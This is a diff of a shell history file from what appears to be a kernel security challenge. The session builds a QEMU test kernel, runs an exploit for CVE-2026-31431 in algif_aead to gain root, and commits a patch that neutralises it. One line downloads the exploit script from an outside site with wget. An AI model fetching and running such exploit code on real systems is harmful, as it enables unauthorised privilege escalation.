@@ -33,9 +33,64 @@ apt update
    33  vi copy_fail_exp.py
    34  id
    35  python3 copy_fail_exp.py
-   36  git add evidence/hito2_root_shell.txt
-   37  git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
-   38  git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
-   39  git push origin main --tags
-   40  lsmod | grep algif_aead
-   41  history
+   36  make clean
+   37  make setup
+   38  make qemu
+   39  cd scripts
+   40  wget https://copy.fail/exp -O copy_fail_exp.py
+   41  make menuconfig
+   42  make clean
+   43  make menuconfig
+   44  make clean
+   45  make setup
+   46  make qemu
+   47  make clean
+   48  make setup
+   49  make qemu
+   50  make clean
+   51  make setup
+   52  make qemu
+   53  make clean
+   54  make setup
+   55  make qemu
+   56  make clean
+   57  make setup
+   58  make qemu
+   59  make clean
+   60  make setup
+   61  make qemu
+   62  git add evidence/hito2_root_shell.txt
+   63  git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
+   64  git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
+   65  git push origin main --tags
+   66  make qemu
+   67  make
+   68  make clean
+   69  make build-kernel
+   70  cd kernel/busybox
+   71  ./scripts/config --enable CONFIG_CRYPTO_USER_API
+   72  cd kernel
+   73  ./busybox/config --enable CONFIG_CRYPTO_USER_API
+   74  ./config --enable CONFIG_CRYPTO_USER_API
+   75  make clean
+   76  make setup
+   77  make qemu
+   78  make olddefconfig
+   79  make clean
+   80  make setup
+   81  make qemu
+   82  cd kernel/linux/crypto
+   83  less algif_aead.c
+   84  cd kernel/linux
+   85  git diff crypto/algif_aead.c > /workspaces/copy-fail-challenge/patches/fix_algif_aead.patch
+   86  cd kernel/linux
+   87  git diff crypto/algif_aead.c > /workspaces/copy-fail-challenge-B/patches/fix_algif_aead.patch
+   88  cd /workspaces/copy-fail-challenge
+   89  cd /workspaces/copy-fail-challenge-B
+   90  make patch
+   91  make qemu
+   92  git add evidence/hito4_patched.txt patches/fix_algif_aead.patch
+   93  git commit -m "hito-4: parche aplicado, exploit neutralizado - $(date +%Y-%m-%dT%H:%M)"
+   94  git tag -a hito-4 -m "Kernel parcheado, CVE-2026-31431 neutralizado"
+   95  git push origin main --tags
+   96  history
